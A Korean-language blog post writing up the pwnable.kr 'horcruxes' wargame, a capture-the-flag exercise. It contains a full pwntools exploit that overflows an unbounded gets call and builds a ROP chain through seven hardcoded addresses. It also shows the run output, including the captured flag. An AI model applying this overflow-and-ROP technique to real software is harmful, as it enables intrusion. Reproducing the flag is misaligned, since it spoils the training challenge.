---
layout: post
title: "pwnable.kr - horcruxes"
date: 2026-02-19
categories: pwnable wargame
---
# horcruxes
> 볼드모트가 그의 영혼을 나누어 7개의 호크룩스에 봉인했어요! 모든 호크룩스를 찾아 ROP하세요! <br>
저자: Jiwon Choi

# 문제 개요
* pwnable.kr - Toddler's Bottle
* 7 point
* files: `horcruxes`, `readme`

# 프로그램 분석
리버싱 한 결과 총 7개의 호크룩스 함수가 있으며 각 함수는 랜덤값을 출력합니다. 그리고 7개의 모든 호크룩스를 합한 값을 마지막으로 입력하면 flag를 출력합니다  

# 설계 및 시나리오
범위 제한 없는 gets함수가 있으므로 버퍼 오버플로우를 사용하여 `A` -> `B` -> `C` -> `D` -> `E` -> `F` -> `G` -> `main`를 순서대로 실행하는 ROP체인을 구성할 수 있습니다.

# 익스플로잇
```
from pwn import *
import re
import ctypes

def to_int32(n):
    return ctypes.c_int32(n).value

r = remote("0", 9032)

r.sendlineafter(b"Select Menu:", b'1')

payload = b'A'* 120 
payload += p32(0x804129d) + p32(0x80412cf) + p32(0x8041301) + p32(0x8041333) 
payload += p32(0x8041365) + p32(0x8041397) + p32(0x80413c9) + p32(0x804150b)

r.sendline(payload)

full_output = r.recvuntil(b"Select Menu:") 
print(full_output.decode(errors='ignore'))

exp_values = re.findall(r'EXP \+([+-]?\d+)', full_output.decode(errors='ignore'))

total_exp = 0
for val in exp_values:
    total_exp += int(val)

final_total = to_int32(total_exp)

print(f"Extracted: {exp_values}")
print(f"Python Sum: {total_exp}")
print(f"Signed 32bit Sum: {final_total}")

r.sendline(b'1')
r.sendline(str(final_total).encode())

r.interactive()
```

# 결과 
```
horcruxes@ubuntu:/tmp/a$ python3 main.py
[┤] Opening connection to 0 on port 9032: Tryin[+] Opening connection to 0 on port 9032: Done
How many EXP did you earned? : You'd better get more experience to kill Voldemort
You found "Tom Riddle's Diary" (EXP +-1241153607)
You found "Marvolo Gaunt's Ring" (EXP +-1905003586)
You found "Helga Hufflepuff's Cup" (EXP +2106776084)
You found "Salazar Slytherin's Locket" (EXP +1803502743)
You found "Rowena Ravenclaw's Diadem" (EXP +-1462269776)
You found "Nagini the Snake" (EXP +1867424878)
You found "Harry Potter" (EXP +1059253487)
Select Menu:
Extracted: ['-1241153607', '-1905003586', '2106776084', '1803502743', '-1462269776', '1867424878', '1059253487']
Python Sum: 2228530223
Signed 32bit Sum: -2066437073
[*] Switching to interactive mode
How many EXP did you earned? : The_M4gic_sp3l1_is_Avada_Ked4vra
```